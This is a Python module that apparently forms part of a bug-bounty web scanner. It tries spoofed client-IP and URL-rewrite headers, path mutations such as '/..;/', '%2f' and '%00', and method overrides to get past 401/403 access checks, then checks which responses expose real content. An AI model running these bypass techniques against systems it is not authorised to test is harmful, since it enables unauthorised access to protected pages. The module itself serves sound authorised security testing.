"""401/403 access-control bypass engine.

Modern bug-bounty targets frequently hide the interesting surface behind an
authorisation check (``401``/``403``).  The request-shape tricks popularised by
``gobypass403`` and ``nomore403`` (spoofed proxy headers, URL-rewrite headers,
path normalisation and HTTP method overrides) can turn that wall into a page
worth scanning for XSS.  This module implements those techniques and, just as
importantly, the *verification* that separates a real bypass from a CDN/WAF
block page or the same login screen rendered with a different status code.

The engine is deliberately conservative:

* every technique is bounded (``max_attempts``) and cacheable per URL;
* results are only accepted when the status code improves **and** the body
  diverges from the original 401/403 **and** it carries real content;
* block/login/soft-404 fingerprints are rejected instead of reported;
* state-changing methods (``PUT``/``PATCH``/``DELETE``) are never sent unless
  the caller explicitly opts in with ``aggressive=True``;
* successful results are serialisable so ``--resume`` can replay the same
  request shape without re-probing the target.
"""

from __future__ import annotations

import asyncio
import hashlib
import re
from dataclasses import dataclass, field
from difflib import SequenceMatcher
from typing import Any, Dict, Iterable, List, Optional, Sequence, Tuple
from urllib.parse import urlunsplit, urlsplit

__all__ = [
    "BYPASS_CATEGORIES",
    "PATH_VARIANTS",
    "TECHNIQUE_HEADERS",
    "AccessBypassEngine",
    "BypassAttempt",
    "BypassResult",
    "mutate_path",
    "path_variants",
    "plan_attempts",
]


# ---------------------------------------------------------------------------
# Technique catalog
# ---------------------------------------------------------------------------

# Proxy / client-IP headers.  Ordered by how often they work in the wild.
_IP_HEADERS: Tuple[Tuple[str, str], ...] = (
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Real-IP", "127.0.0.1"),
    ("X-Originating-IP", "127.0.0.1"),
    ("X-Client-IP", "127.0.0.1"),
    ("X-Remote-IP", "127.0.0.1"),
    ("X-Remote-Addr", "127.0.0.1"),
    ("X-Forwarded", "127.0.0.1"),
    ("Forwarded", "for=127.0.0.1;proto=http;host=127.0.0.1"),
    ("True-Client-IP", "127.0.0.1"),
    ("CF-Connecting-IP", "127.0.0.1"),
    ("X-Cluster-Client-IP", "127.0.0.1"),
    ("X-ProxyUser-Ip", "127.0.0.1"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("Client-IP", "127.0.0.1"),
)

# Headers that tell a reverse proxy which URL/path to route internally.
_URL_HEADERS: Tuple[Tuple[str, str], ...] = (
    ("X-Original-URL", "{path}"),
    ("X-Rewrite-URL", "{path}"),
    ("X-Original-URI", "{path}"),
)

# Host / scheme confusion headers.
_HOST_HEADERS: Tuple[Tuple[str, str], ...] = (
    ("X-Forwarded-Host", "127.0.0.1"),
    ("X-Host", "127.0.0.1"),
    ("X-Forwarded-Server", "127.0.0.1"),
    ("X-Original-Host", "127.0.0.1"),
    ("X-Forwarded-Proto", "http"),
    ("X-Forwarded-Port", "80"),
    ("X-Forwarded-Prefix", "/"),
)

# Headers that change how the framework resolves the request method or origin.
_METHOD_HEADERS: Tuple[Tuple[str, str], ...] = (
    ("X-HTTP-Method-Override", "GET"),
    ("X-Method-Override", "GET"),
    ("X-HTTP-Method", "GET"),
)

_SELF_HEADERS: Tuple[Tuple[str, str], ...] = (
    ("Referer", "{origin}/"),
    ("Origin", "{origin}"),
    ("X-Requested-With", "XMLHttpRequest"),
)

#: Every header technique as ``(header, value_template)``.  ``{path}`` and
#: ``{origin}`` are expanded per request.
TECHNIQUE_HEADERS: Tuple[Tuple[str, str], ...] = (
    _IP_HEADERS + _URL_HEADERS + _HOST_HEADERS + _METHOD_HEADERS + _SELF_HEADERS
)

BYPASS_CATEGORIES: Tuple[str, ...] = ("header", "path", "method")

#: Path mutations.  ``(variant id, human label, transform)``.  Each transform
#: receives the original path (always starting with ``/``).
PATH_VARIANTS: Tuple[Tuple[str, str], ...] = (
    ("trailing-slash", "append a trailing slash"),
    ("double-slash", "prefix the path with an extra slash"),
    ("dot-prefix", "prefix the path with a dot segment"),
    ("dot-slash", "insert a /./ segment"),
    ("encoded-dot", "encode the leading dot segment"),
    ("semicolon", "append a path parameter separator"),
    ("semicolon-slash", "append /..;/ (Tomcat/Spring normalisation)"),
    ("matrix-css", "append a matrix parameter with a CSS extension"),
    ("matrix-json", "append a matrix parameter with a JSON extension"),
    ("slash-encoded", "percent-encode path separators"),
    ("slash-double-encoded", "double-encode path separators"),
    ("null-suffix", "append an encoded NUL byte"),
    ("null-html", "append an encoded NUL byte and an extension"),
    ("tab-suffix", "append an encoded tab"),
    ("space-suffix", "append an encoded space"),
    ("backslash", "replace separators with backslashes"),
    ("case-toggle", "invert the case of the path"),
    ("append-json", "append a .json extension"),
    ("append-dot", "append a trailing dot segment"),
    ("prefix-dotdot", "prefix the path with a parent segment"),
    ("trailing-dot", "append a trailing dot"),
    ("slash-semicolon", "append /; to the path"),
)

_PATH_VARIANT_IDS = frozenset(variant for variant, _ in PATH_VARIANTS)

# Methods that can be replayed safely during injection.  Destructive verbs are
# only ever *probed* (never used to send payloads) and only in aggressive mode.
_SAFE_METHODS: Tuple[str, ...] = ("HEAD", "OPTIONS", "TRACE")
_AGGRESSIVE_METHODS: Tuple[str, ...] = ("POST", "PUT", "PATCH")
_REPLAYABLE_METHODS = frozenset({"GET", "POST"})

_LOGIN_PATH_RE = re.compile(
    r"(?:^|/)(?:login|log-in|signin|sign-in|sign_in|auth|authenticate|sso|oauth|session)(?:/|$|\.)",
    re.I,
)
_LOGIN_BODY_RE = re.compile(
    r"(?:<title[^>]*>[^<]*(?:log\s*in|sign\s*in)[^<]*</title>|type\s*=\s*[\"']password[\"'])",
    re.I,
)
_BLOCK_MARKERS: Tuple[str, ...] = (
    "access denied",
    "permission denied",
    "not authorized",
    "unauthorized",
    "request blocked",
    "blocked by",
    "attention required",
    "just a moment",
    "checking your browser",
    "cf-chl",
    "cloudflare ray id",
    "web application firewall",
    "security policy",
    "captcha",
    "forbidden",
    "拒绝访问",
    "无权访问",
)
_NOT_FOUND_MARKERS: Tuple[str, ...] = (
    "not found",
    "page not found",
    "does not exist",
    "cannot be found",
    "no longer available",
    "404",
)
_CHALLENGE_MARKERS: Tuple[str, ...] = (
    "attention required",
    "just a moment",
    "checking your browser",
    "cf-chl",
    "cloudflare ray id",
    "captcha",
    "verify you are human",
    "ddos protection",
)
_CONTENT_PATTERNS: Tuple[str, ...] = (
    r"<form\b",
    r"<input\b",
    r"<textarea\b",
    r"<a\s[^>]*href",
    r"<script\b",
    r"<table\b",
    r"<h1\b",
    r"<main\b",
    r"\{\s*\"[^\"]+\"\s*:",
    r"\[\s*\{",
)
_CONTENT_RE = tuple(re.compile(pattern, re.I) for pattern in _CONTENT_PATTERNS)
_HEX_RE = re.compile(r"[0-9a-f]{16,}")
_WS_RE = re.compile(r"\s+")
# Bodies that are clearly binary despite a text content type.
_BINARY_RE = re.compile(rb"[\x00-\x08\x0e-\x1f]")
_HTML_TYPES = ("text/html", "application/xhtml", "text/plain", "application/json", "text/xml", "application/xml")


def _normalise_path(path: str) -> str:
    path = path or "/"
    return path if path.startswith("/") else "/" + path


def mutate_path(path: str, variant: str) -> str:
    """Apply one named path mutation, preserving the leading slash."""
    original = _normalise_path(path)
    trimmed = original.rstrip("/") or "/"

    if variant == "trailing-slash":
        return trimmed + "/"
    if variant == "double-slash":
        return "//" + original.lstrip("/")
    if variant == "dot-prefix":
        return "/." + original
    if variant == "dot-slash":
        return "/./" + original.lstrip("/")
    if variant == "encoded-dot":
        return "/%2e" + original
    if variant == "semicolon":
        return original + ";"
    if variant == "semicolon-slash":
        return trimmed + "/..;/"
    if variant == "matrix-css":
        return original + ";.css"
    if variant == "matrix-json":
        return original + ";.json"
    if variant == "slash-encoded":
        return original.replace("/", "%2f")
    if variant == "slash-double-encoded":
        return original.replace("/", "%252f")
    if variant == "null-suffix":
        return original + "%00"
    if variant == "null-html":
        return original + "%00.html"
    if variant == "tab-suffix":
        return original + "%09"
    if variant == "space-suffix":
        return original + "%20"
    if variant == "backslash":
        return original.replace("/", "\\")
    if variant == "case-toggle":
        return "".join(ch.swapcase() for ch in original)
    if variant == "append-json":
        return original + ".json"
    if variant == "append-dot":
        return original + "/."
    if variant == "prefix-dotdot":
        return "/.." + original
    if variant == "trailing-dot":
        return original + "."
    if variant == "slash-semicolon":
        return original + "/;"
    return original


def path_variants(path: str) -> List[Tuple[str, str]]:
    """Return ``(variant, mutated_path)`` pairs, de-duplicated and stable."""
    seen = {_normalise_path(path)}
    variants: List[Tuple[str, str]] = []
    for variant, _label in PATH_VARIANTS:
        candidate = mutate_path(path, variant)
        if candidate in seen:
            continue
        seen.add(candidate)
        variants.append((variant, candidate))
    return variants


def _origin(url: str) -> str:
    parts = urlsplit(url)
    if not parts.scheme or not parts.netloc:
        return ""
    return urlunsplit((parts.scheme, parts.netloc, "", "", ""))


def _replace_path(url: str, new_path: str) -> str:
    parts = urlsplit(url)
    return urlunsplit((parts.scheme, parts.netloc, new_path, parts.query, parts.fragment))


def _cache_key(url: str) -> str:
    parts = urlsplit(url)
    return urlunsplit(
        (parts.scheme.lower(), parts.netloc.lower(), parts.path or "/", parts.query, "")
    )


def _host_key(url: str) -> str:
    return (urlsplit(url).netloc or "").lower()


# ---------------------------------------------------------------------------
# Planning
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class BypassAttempt:
    """One request shape to try against a forbidden URL."""

    name: str
    category: str
    url: str
    method: str = "GET"
    headers: Tuple[Tuple[str, str], ...] = ()
    variant: str = ""

    def header_dict(self) -> Dict[str, str]:
        return dict(self.headers)


def _header_attempts(url: str) -> List[BypassAttempt]:
    parts = urlsplit(url)
    path = parts.path or "/"
    origin = _origin(url)
    attempts: List[BypassAttempt] = []

    for header, value in _IP_HEADERS:
        attempts.append(
            BypassAttempt(
                name=f"header:{header}",
                category="header",
                url=url,
                headers=((header, value),),
            )
        )
    for header, template in _URL_HEADERS:
        attempts.append(
            BypassAttempt(
                name=f"header:{header}",
                category="header",
                url=url,
                headers=((header, template.format(path=path, origin=origin)),),
            )
        )
    for header, value in _HOST_HEADERS:
        attempts.append(
            BypassAttempt(
                name=f"header:{header}",
                category="header",
                url=url,
                headers=((header, value.format(path=path, origin=origin)),),
            )
        )
    for header, value in _METHOD_HEADERS:
        attempts.append(
            BypassAttempt(
                name=f"header:{header}",
                category="header",
                url=url,
                headers=((header, value),),
            )
        )
    for header, template in _SELF_HEADERS:
        attempts.append(
            BypassAttempt(
                name=f"header:{header}",
                category="header",
                url=url,
                headers=((header, template.format(path=path, origin=origin)),),
            )
        )
    return attempts


def _path_attempts(url: str) -> List[BypassAttempt]:
    path = urlsplit(url).path or "/"
    return [
        BypassAttempt(
            name=f"path:{variant}",
            category="path",
            url=_replace_path(url, mutated),
            variant=variant,
        )
        for variant, mutated in path_variants(path)
    ]


def _method_attempts(url: str, aggressive: bool) -> List[BypassAttempt]:
    methods = list(_SAFE_METHODS)
    if aggressive:
        methods.extend(_AGGRESSIVE_METHODS)
    return [
        BypassAttempt(name=f"method:{method}", category="method", url=url, method=method)
        for method in methods
    ]


def _matches(attempt: BypassAttempt, techniques: Sequence[str]) -> bool:
    """Match a selector against a category, a full technique name or a variant.

    Selectors are compared exactly (case-insensitively) rather than as
    substrings: ``method`` must select the method category and not every
    ``X-HTTP-Method-Override`` header.
    """
    if not techniques:
        return True
    token = attempt.name.split(":", 1)[-1].lower()
    for selector in techniques:
        selector = selector.strip().lower()
        if not selector:
            continue
        if selector in (attempt.category, token, attempt.variant.lower(), attempt.name.lower()):
            return True
    return False


def plan_attempts(
    url: str,
    *,
    techniques: Optional[Sequence[str]] = None,
    aggressive: bool = False,
    limit: int = 24,
) -> List[BypassAttempt]:
    """Build a deterministic, de-duplicated request plan for one URL.

    Header techniques run first because they are the highest-yield, lowest
    impact bypasses.  Path mutations follow, then method changes (last, since
    they cannot always be replayed during injection).
    """
    plan: List[BypassAttempt] = [
        *_header_attempts(url),
        *_path_attempts(url),
        *_method_attempts(url, aggressive),
    ]
    selected = [
        attempt
        for attempt in plan
        if _matches(attempt, techniques or ())
    ]
    # De-duplicate identical request shapes while keeping plan order.  Two
    # different header names can expand to the same value but are still
    # distinct requests, so the key includes the header names.
    seen = set()
    unique: List[BypassAttempt] = []
    for attempt in selected:
        key = (
            attempt.category,
            attempt.method,
            attempt.url,
            tuple(sorted(attempt.headers)),
        )
        if key in seen:
            continue
        seen.add(key)
        unique.append(attempt)
    return unique[: max(0, int(limit))]


# ---------------------------------------------------------------------------
# Verification
# ---------------------------------------------------------------------------


def _normalise_body(body: str) -> str:
    text = _WS_RE.sub(" ", (body or "")[:6000]).strip().lower()
    return _HEX_RE.sub(" ", text)


def _body_hash(body: str) -> str:
    return hashlib.sha1(_normalise_body(body).encode("utf-8", "replace")).hexdigest()


def _similarity(base: str, candidate: str) -> float:
    left, right = _normalise_body(base), _normalise_body(candidate)
    if not left or not right:
        return 0.0
    matcher = SequenceMatcher(None, left[:4000], right[:4000], autojunk=False)
    # quick_ratio() is a cheap upper bound; fall back to ratio() only when the
    # bound is close enough to matter for the decision.
    quick = matcher.quick_ratio()
    if quick < 0.85:
        return quick
    return matcher.ratio()


def _marker_count(body: str, markers: Iterable[str]) -> int:
    lowered = (body or "")[:20000].lower()
    return sum(1 for marker in markers if marker in lowered)


def _content_score(body: str) -> int:
    sample = (body or "")[:20000]
    return sum(1 for pattern in _CONTENT_RE if pattern.search(sample))


def _is_login_response(response: Any, baseline: Any) -> bool:
    final_url = str(getattr(response, "url", "") or "")
    final_path = urlsplit(final_url).path or "/"
    base_path = urlsplit(str(getattr(baseline, "url", "") or "")).path or "/"
    if final_path != base_path and _LOGIN_PATH_RE.search(final_path):
        return True
    body = str(getattr(response, "text", "") or "")
    if _LOGIN_BODY_RE.search(body) and not _LOGIN_BODY_RE.search(
        str(getattr(baseline, "text", "") or "")
    ):
        return True
    return False


@dataclass
class BypassResult:
    """A verified (or best-effort) bypass of a 401/403 response."""

    url: str
    technique: str
    category: str
    status: int
    baseline_status: int
    method: str = "GET"
    request_url: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    variant: str = ""
    reason: str = ""
    confidence: str = "medium"
    content_type: str = ""
    body_length: int = 0
    attempts: int = 0
    excerpt: str = ""

    def applied_url(self, url: str) -> str:
        """Replay the successful path mutation against another URL."""
        if not self.variant:
            return url
        return _replace_path(url, mutate_path(urlsplit(url).path or "/", self.variant))

    def replay_headers(self) -> Dict[str, str]:
        return dict(self.headers)

    def can_replay_method(self) -> bool:
        return self.method.upper() in _REPLAYABLE_METHODS

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "technique": self.technique,
            "category": self.category,
            "status": self.status,
            "baseline_status": self.baseline_status,
            "method": self.method,
            "request_url": self.request_url,
            "headers": dict(self.headers),
            "variant": self.variant,
            "reason": self.reason,
            "confidence": self.confidence,
            "content_type": self.content_type,
            "body_length": self.body_length,
            "attempts": self.attempts,
            "excerpt": self.excerpt[:400],
        }

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> "BypassResult":
        headers = data.get("headers")
        return cls(
            url=str(data.get("url") or ""),
            technique=str(data.get("technique") or ""),
            category=str(data.get("category") or ""),
            status=int(data.get("status") or 0),
            baseline_status=int(data.get("baseline_status") or 0),
            method=str(data.get("method") or "GET"),
            request_url=str(data.get("request_url") or ""),
            headers={str(k): str(v) for k, v in headers.items()} if isinstance(headers, dict) else {},
            variant=str(data.get("variant") or ""),
            reason=str(data.get("reason") or ""),
            confidence=str(data.get("confidence") or "medium"),
            content_type=str(data.get("content_type") or ""),
            body_length=int(data.get("body_length") or 0),
            attempts=int(data.get("attempts") or 0),
            excerpt=str(data.get("excerpt") or ""),
        )


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------


class _NullConsole:
    """No-op console used when the engine is embedded without a UI."""

    def debug(self, *_args: Any, **_kwargs: Any) -> None:
        return None

    def info(self, *_args: Any, **_kwargs: Any) -> None:
        return None

    def warn(self, *_args: Any, **_kwargs: Any) -> None:
        return None


class AccessBypassEngine:
    """Probe and verify 401/403 bypasses for a set of URLs."""

    def __init__(
        self,
        http: Any,
        console: Any,
        *,
        max_attempts: int = 24,
        concurrency: int = 2,
        timeout: float = 15.0,
        techniques: Optional[Sequence[str]] = None,
        aggressive: bool = False,
        similarity_threshold: float = 0.90,
    ) -> None:
        self.http = http
        self.console = console if console is not None else _NullConsole()
        self.max_attempts = max(1, min(64, int(max_attempts)))
        self.concurrency = max(1, min(8, int(concurrency)))
        self.timeout = max(3.0, float(timeout))
        self.techniques = [item for item in (techniques or ()) if item]
        self.aggressive = bool(aggressive)
        self.similarity_threshold = min(0.99, max(0.5, float(similarity_threshold)))
        # Bound the total probe volume per host so a site that forbids every
        # path cannot turn discovery into an unbounded request storm.  A known
        # winning shape is still replayed after the budget is exhausted.
        self.max_total_attempts = max(self.max_attempts, self.max_attempts * 8)
        self._host_attempts: Dict[str, int] = {}
        self._results: Dict[str, Optional[BypassResult]] = {}
        self._locks: Dict[str, asyncio.Lock] = {}
        # A technique that worked for one route usually works for its siblings
        # behind the same proxy.  Remember it per host and try it first, while
        # still verifying every new URL independently.
        self._host_winners: Dict[str, BypassResult] = {}
        self.attempts = 0

    # -- planning ---------------------------------------------------------
    def plan(self, url: str) -> List[BypassAttempt]:
        return plan_attempts(
            url,
            techniques=self.techniques,
            aggressive=self.aggressive,
            limit=self.max_attempts,
        )

    def _preferred(self, url: str) -> List[BypassAttempt]:
        """Re-shape a host-wide winner for ``url`` so it is tried first."""
        winner = self._host_winners.get(_host_key(url))
        if winner is None:
            return []
        if winner.category == "method" and winner.method.upper() not in _REPLAYABLE_METHODS:
            return []
        path = urlsplit(url).path or "/"
        headers = dict(winner.headers)
        for header, template in _URL_HEADERS:
            if header in headers:
                headers[header] = template.format(path=path, origin=_origin(url))
        attempt_url = url
        if winner.variant:
            attempt_url = _replace_path(url, mutate_path(path, winner.variant))
        return [
            BypassAttempt(
                name=winner.technique,
                category=winner.category,
                url=attempt_url,
                method=winner.method or "GET",
                headers=tuple(sorted(headers.items())),
                variant=winner.variant,
            )
        ]

    def _remember(self, result: BypassResult) -> None:
        if result.confidence == "low":
            return
        if result.category == "method" and not result.can_replay_method():
            return
        self._host_winners[_host_key(result.url)] = result

    # -- cache ------------------------------------------------------------
    def cached(self, url: str) -> Optional[BypassResult]:
        return self._results.get(_cache_key(url))

    def is_known(self, url: str) -> bool:
        return _cache_key(url) in self._results

    def load_results(self, items: Iterable[Dict[str, Any]]) -> int:
        loaded = 0
        for item in items:
            try:
                result = BypassResult.from_dict(item)
            except Exception:
                continue
            if not result.url or not result.technique:
                continue
            self._results[_cache_key(result.url)] = result
            self._remember(result)
            loaded += 1
        return loaded

    def export_results(self) -> List[Dict[str, Any]]:
        return [
            result.to_dict()
            for result in self._results.values()
            if result is not None
        ]

    # -- probing ----------------------------------------------------------
    async def probe(self, url: str, baseline: Any = None) -> Optional[BypassResult]:
        """Return a verified bypass for ``url`` or ``None``.

        ``baseline`` is the already-fetched 401/403 response.  When omitted the
        URL is fetched once and cached by the HTTP engine.
        """
        key = _cache_key(url)
        if key in self._results:
            return self._results[key]

        lock = self._locks.get(key)
        if lock is None:
            lock = asyncio.Lock()
            self._locks[key] = lock

        async with lock:
            if key in self._results:
                return self._results[key]
            if baseline is None:
                baseline = await self._fetch("GET", url, {})
            if baseline is None or getattr(baseline, "error", None):
                self._results[key] = None
                return None
            if int(getattr(baseline, "status", 0) or 0) not in (401, 403):
                self._results[key] = None
                return None

            host = _host_key(url)
            budget = self.max_total_attempts - self._host_attempts.get(host, 0)
            attempts = self._preferred(url)
            if attempts:
                seen = {
                    (item.category, item.method, item.url, tuple(sorted(item.headers)))
                    for item in attempts
                }
                for item in self.plan(url):
                    key_ = (item.category, item.method, item.url, tuple(sorted(item.headers)))
                    if key_ in seen:
                        continue
                    seen.add(key_)
                    attempts.append(item)
                # The known-good shape always gets one try; extra shapes only
                # while the per-host budget lasts.
                attempts = attempts[:1] if budget <= 0 else attempts[:budget]
            else:
                if budget <= 0:
                    self._results[key] = None
                    return None
                attempts = self.plan(url)[:budget]
            result = await self._run(url, baseline, attempts)
            if result is not None:
                self._remember(result)
            self._results[key] = result
            return result

    async def _fetch(
        self,
        method: str,
        url: str,
        headers: Dict[str, str],
    ) -> Any:
        try:
            return await asyncio.wait_for(
                self.http.request(
                    method,
                    url,
                    headers=headers or None,
                    allow_redirects=True,
                    cache=False,
                ),
                timeout=self.timeout,
            )
        except Exception:
            return None

    def _result_for(
        self,
        attempt: BypassAttempt,
        response: Any,
        baseline: Any,
        reason: str,
        confidence: str,
        attempted: int,
    ) -> BypassResult:
        body = str(getattr(response, "text", "") or "")
        return BypassResult(
            url=attempt.url,
            technique=attempt.name,
            category=attempt.category,
            status=int(getattr(response, "status", 0) or 0),
            baseline_status=int(getattr(baseline, "status", 0) or 0),
            method=attempt.method,
            request_url=str(getattr(response, "url", "") or attempt.url),
            headers=attempt.header_dict(),
            variant=attempt.variant,
            reason=reason,
            confidence=confidence,
            content_type=str(getattr(response, "header", lambda *_: "")("content-type", "") or ""),
            body_length=len(body),
            attempts=attempted,
            excerpt=body[:400],
        )

    async def _run(
        self,
        url: str,
        baseline: Any,
        attempts: Sequence[BypassAttempt],
    ) -> Optional[BypassResult]:
        if not attempts:
            return None
        attempted = 0
        base_status = int(getattr(baseline, "status", 0) or 0)
        for start in range(0, len(attempts), self.concurrency):
            chunk = list(attempts[start : start + self.concurrency])
            self.attempts += len(chunk)
            host = _host_key(url)
            self._host_attempts[host] = self._host_attempts.get(host, 0) + len(chunk)
            attempted += len(chunk)
            responses = await asyncio.gather(
                *(self._send(attempt) for attempt in chunk),
                return_exceptions=True,
            )
            for attempt, response in zip(chunk, responses):
                if isinstance(response, BaseException) or response is None:
                    continue
                accepted, reason, confidence = self._classify(baseline, response)
                if not accepted:
                    continue
                if attempt.category == "method" and attempt.method.upper() not in _REPLAYABLE_METHODS:
                    # A successful HEAD/OPTIONS/TRACE proves the ACL is method
                    # based but cannot carry an injection payload.  Keep it as
                    # evidence only (low confidence).
                    confidence = "low"
                self.console.debug(
                    f"403 bypass via {attempt.name} on {url}: {reason}"
                )
                return self._result_for(
                    attempt, response, baseline, reason, confidence, attempted
                )
            self.console.debug(
                f"403 bypass: {len(chunk)} attempt(s) on {url} still blocked "
                f"(baseline {base_status})"
            )
        return None

    async def _send(self, attempt: BypassAttempt) -> Any:
        return await self._fetch(attempt.method, attempt.url, attempt.header_dict())

    def _classify(self, baseline: Any, response: Any) -> Tuple[bool, str, str]:
        """Return ``(accepted, reason, confidence)`` for one candidate."""
        if getattr(response, "error", None):
            return False, "", "low"
        status = int(getattr(response, "status", 0) or 0)
        if status in (401, 403, 407, 429, 451, 503):
            return False, "", "low"
        if not (200 <= status < 400):
            return False, "", "low"

        body = str(getattr(response, "text", "") or "")
        # Compact SPA/fragment responses can be smaller than a full page; the
        # content-marker and divergence checks below do the real work.
        if len(body) < 16:
            return False, "", "low"
        if _BINARY_RE.search(body.encode("utf-8", "replace")[:4096]):
            return False, "", "low"

        content_type = str(
            getattr(response, "header", lambda *_: "")("content-type", "") or ""
        ).lower()
        if content_type.startswith(("image/", "video/", "audio/", "font/", "application/octet-stream")):
            return False, "", "low"

        base_body = str(getattr(baseline, "text", "") or "")
        if _is_login_response(response, baseline):
            return False, "", "low"
        if _marker_count(body, _CHALLENGE_MARKERS):
            return False, "", "low"

        base_blocks = _marker_count(base_body, _BLOCK_MARKERS)
        candidate_blocks = _marker_count(body, _BLOCK_MARKERS)
        if candidate_blocks > base_blocks:
            return False, "", "low"
        base_missing = _marker_count(base_body, _NOT_FOUND_MARKERS)
        candidate_missing = _marker_count(body, _NOT_FOUND_MARKERS)
        content = _content_score(body)
        if candidate_missing > base_missing and content < 2:
            return False, "", "low"
        # A block-page-shaped body with only a support link must not pass as a
        # privileged page even when the status code became 200.
        if candidate_blocks and content < 3:
            return False, "", "low"

        if _body_hash(body) == _body_hash(base_body):
            return False, "", "low"
        similarity = _similarity(base_body, body)
        if similarity >= self.similarity_threshold:
            return False, "", "low"
        if content <= 0 and content_type and not any(
            content_type.startswith(item) for item in _HTML_TYPES
        ):
            return False, "", "low"

        base_status = int(getattr(baseline, "status", 0) or 0)
        reason = (
            f"status {base_status}->{status}, body {len(base_body)}->{len(body)} bytes, "
            f"similarity {similarity:.2f}, content markers {content}"
        )
        confidence = "medium" if content < 2 or candidate_blocks else "high"
        return True, reason, confidence


# Backwards-friendly aliases for callers that prefer the longer names.
AccessBypass = AccessBypassEngine
